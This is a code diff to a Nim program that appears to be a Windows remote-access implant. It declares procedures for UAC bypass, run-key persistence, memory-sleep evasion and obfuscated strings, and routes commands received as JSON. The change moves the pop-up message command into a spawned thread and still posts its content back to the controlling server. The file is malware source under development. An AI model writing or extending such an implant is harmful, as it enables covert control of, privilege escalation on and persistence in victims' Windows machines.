@@ -9,6 +9,7 @@ import winim/[lean, com]
 import wAuto/[registry]
 import system/[io]
 import httpclient
+import threadpool
 import nimprotect
 import strutils
 import osproc
@@ -35,7 +36,7 @@ proc change_memsleep(technique: string): bool
 proc set_run_key(key_name: string, cmd: string): bool
 proc set_spe(process_name: string, cmd: string): bool
 proc uac_bypass(bypass_method: string, cmd: string, keep_or_die: string): bool
-proc msgbox(title: string, text: string): bool
+proc msgbox(title: string, text: string) {.gcsafe.}
 proc speak(text: string): bool
 
 # Helpers
@@ -453,23 +454,10 @@ proc uac_bypass(bypass_method: string, cmd: string, keep_or_die: string): bool =
         return is_success_post
 
 
-proc msgbox(title: string, text: string): bool =
-    var is_success: bool
-    
-    try:
-        MessageBox(0, text, title, 0)
-        is_success = true
-    except:
-        is_success = false
-    
-    var data = {
-        protectString("msgbox_content"): "[" & title & "] " & text,
-        protectString("is_success"): $is_success
-        
-    }.toOrderedTable()
-    
-    is_success = post_data(client, "msgbox" , $data)
-    return is_success
+proc msgbox(title: string, text: string) {.gcsafe.} =
+    # spawn in a new thread
+    MessageBox(0, text, title, 0)
+
 
 
 proc speak(text: string): bool =
@@ -597,7 +585,15 @@ proc windows_parse_command*(command: JsonNode): bool =
         of protectString("uac-bypass"):
             is_success = uac_bypass(command[protectString("bypass_method")].getStr(), command[protectString("elevated_command")].getStr(), command[protectString("keep_or_die")].getStr())
         of protectString("msgbox"):
-            is_success = msgbox(command["title"].getStr(), command["text"].getStr())
+            # spawn in a new thread
+            var title = command["title"].getStr()
+            var text = command["text"].getStr()
+            spawn msgbox(title, text)
+            var data = {
+                protectString("msgbox_content"): "[" & title & "] " & text,
+                protectString("status"): "spawned in a new thread"
+                }.toOrderedTable()
+            discard post_data(client, protectString("msgbox") , $data)
         of protectString("speak"):
             is_success = speak(command["text"].getStr())
         of protectString("sleep"):
